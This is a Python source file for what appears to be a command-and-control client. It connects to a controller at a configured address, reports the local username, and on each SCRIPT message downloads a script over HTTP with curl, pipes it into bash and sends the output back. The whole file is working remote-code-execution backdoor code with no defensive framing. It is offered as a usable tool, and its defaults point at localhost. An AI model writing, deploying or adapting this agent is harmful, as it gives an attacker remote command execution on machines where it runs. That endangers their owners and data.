import socket
from threading import Thread
import logging
from typing import Tuple
from queue import SimpleQueue
from base64 import b64decode, b64encode
import subprocess

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger()


class Message:
    REPLY = 'REPLY'
    SCRIPT = 'SCRIPT'
    conversation_uid: str
    purpose: str
    args: Tuple[str]

    def __init__(self, *args: str):
        assert len(args) >= 2
        self.conversation_uid = args[0]
        self.purpose = args[1]
        self.args = args[2:]

    def __str__(self):
        return f'{self.purpose}:{self.args}'

    @staticmethod
    def from_raw(line: bytes) -> 'Message':
        return Message(*tuple(b64decode(line_part).decode() for line_part in line.split(b':')))

    def to_raw(self):
        return b':'.join(b64encode(line_part.encode()) for line_part in [self.conversation_uid, self.purpose, *self.args])


class Communication:
    messages_received = SimpleQueue()  # type: SimpleQueue[Message]
    messages_to_send = SimpleQueue()  # type: SimpleQueue[Message]

    @staticmethod
    def initialise_communication(sock: socket.socket):
        Thread(target=Communication._receive_messages_forever, args=(sock, Communication.messages_received), daemon=True).start()
        Thread(target=Communication._send_messages_forever, args=(sock, Communication.messages_to_send), daemon=True).start()

    @staticmethod
    def _receive_messages_forever(sock: socket.socket, message_received_queue: 'SimpleQueue[Message]'):
        while True:
            message_received_queue.put(Message.from_raw(Core.receive_line_from_sock(sock)))

    @staticmethod
    def _send_messages_forever(sock: socket.socket, message_to_send_queue: 'SimpleQueue[Message]'):
        header_parts = [Config.username.encode()]
        sock.send(b':'.join([b64encode(header_part) for header_part in header_parts]) + b'\n')
        while True:
            sock.send(message_to_send_queue.get().to_raw() + b'\n')


class Core:
    @staticmethod
    def receive_line_from_sock(sock: socket.socket):
        buffer = b''
        while True:
            chunk = sock.recv(1)
            if b'\n' == chunk:
                return buffer
            else:
                buffer += chunk


class MessageProcessor:
    remote_ip: str
    resources_port: str

    @staticmethod
    def process_messages_forever(remote_ip: str, resources_port: int):
        MessageProcessor.remote_ip = remote_ip
        MessageProcessor.resources_port = resources_port
        while True:
            message = Communication.messages_received.get()
            logger.info(f'Processing: {message}')
            if message.purpose == Message.SCRIPT:
                MessageProcessor._process_script(message)
            else:
                send_error_message('process_messages_forever', f'Unknown message purpose {message.purpose}')

    @staticmethod
    def _get_resource(category: str, name: str) -> bytes:
        print(f'{MessageProcessor.remote_ip}:{MessageProcessor.resources_port}/{category}/{name}')
        curl = subprocess.run(['curl', '-s', f'http://{MessageProcessor.remote_ip}:{MessageProcessor.resources_port}/{category}/{name}'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if curl.returncode != 0:
            send_error_message('process_messages_forever', f'Resources server down or missing {category}/{name}\n{curl.stderr.decode()}')
            raise Exception()
        return curl.stdout

    @staticmethod
    def _process_script(message: Message):
        uid = message.args[0]
        script_name = message.args[1]
        script_data = MessageProcessor._get_resource('scripts', script_name)
        logger.info(f'Opening process for {message.args[1]}')
        script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = script.communicate(script_data)
        Communication.messages_to_send.put(Message(
            Message.REPLY,
            uid,
            stdout.decode(),
            stderr.decode()
        ))


def get_cmd_output(cmd: str, strip_new_line=True) -> str:
    proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    if strip_new_line and proc.stdout.decode()[-1] == '\n':
        return proc.stdout.decode()[:-1]
    else:
        return proc.stdout.decode()


class Config:
    username: str

    @staticmethod
    def initialise():
        Config.username = get_cmd_output('whoami')


def initialise(remote_ip: str, remote_port: int, resources_port: int, local_ip: str):
    Config.initialise()
    sock = socket.create_connection((remote_ip, remote_port))
    Communication.initialise_communication(sock)
    MessageProcessor.process_messages_forever(remote_ip, resources_port)


def send_error_message(location: str, error: str):
    Communication.messages_to_send.put(Message(
        'ERROR',
        location,
        error
    ))


if __name__ == '__main__':
    initialise(
        'localhost',
        1337,
        1338,
        'localhost'
    )
